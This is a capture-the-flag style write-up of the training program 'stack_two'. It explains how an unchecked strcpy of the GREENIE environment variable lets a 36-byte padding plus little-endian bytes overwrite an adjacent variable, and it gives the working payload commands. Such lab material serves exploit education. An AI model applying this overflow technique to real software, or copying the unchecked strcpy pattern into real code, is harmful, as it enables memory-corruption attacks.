# Code Analysis:

## Code Execution:

```bash
./stack_two                                        
stack_two: please set the GREENIE environment variable
```

You must assign a value to the `GREENIE` environment variable.

```bash
export GREENIE='test'

./stack_two          
Try again, you received 0x00000000
```

## Source Code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[32];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("You have correctly modified the variable\n");
  } else {
      printf("Try again, you received 0x%08x\n", modified);
  }

}
```

1. The program initializes the 32-byte `buffer` with the value of the `GREENIE` environment variable.
2. The `modified` variable is initialized to 0.
3. If `modified` equals `0x0d0a0d0a`, the challenge is considered successful.

# Exploitation:

## How?

To set `modified` to `0x0d0a0d0a`, you need to:
- Determine the offset needed to reach `modified`.
- Insert the value `0x0d0a0d0a` after the offset.

## Demonstration:

### Finding the Offset

```bash
export GREENIE=$(python -c 'print("A" * 37)')

echo $GREENIE                                
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

./stack_two                                  
Try again, you received 0x00000041
```

The correct offset is 36 characters.

### Finding `0x0d0a0d0a`

There's no direct ASCII text representation of `0x0d0a0d0a`, so it must be input explicitly as `\x0d\x0a\x0d\x0a`. However, given Little Endian format, it should be input as `\x0a\x0d\x0a\x0d`.

### Payload:

```bash
export GREENIE=$(python2 -c 'print "A"*36 + "\x0a\x0d\x0a\x0d"')

./stack_two                                                     
You have correctly modified the variable
```
